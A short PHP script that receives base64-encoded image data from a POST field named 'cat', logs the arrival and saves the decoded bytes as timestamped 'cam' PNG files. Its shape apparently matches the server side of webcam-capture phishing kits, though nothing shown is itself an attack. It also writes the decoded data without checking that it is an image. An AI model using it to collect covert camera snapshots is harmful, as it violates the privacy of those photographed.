<?php
$date = date('dMYHis');
$imageData = $_POST['cat'] ?? '';

if (!empty($imageData)) {
    file_put_contents('/data/logs/Log.log', "Received at " . date('c') . "\n", FILE_APPEND | LOCK_EX);
}

$filteredData = substr($imageData, strpos($imageData, ",") + 1);
$unencodedData = base64_decode($filteredData);

if ($unencodedData === false) {
    http_response_code(400);
    exit('Invalid image data');
}

$filename = '/data/captures/cam' . $date . '.png';
file_put_contents($filename, $unencodedData, LOCK_EX);

exit();
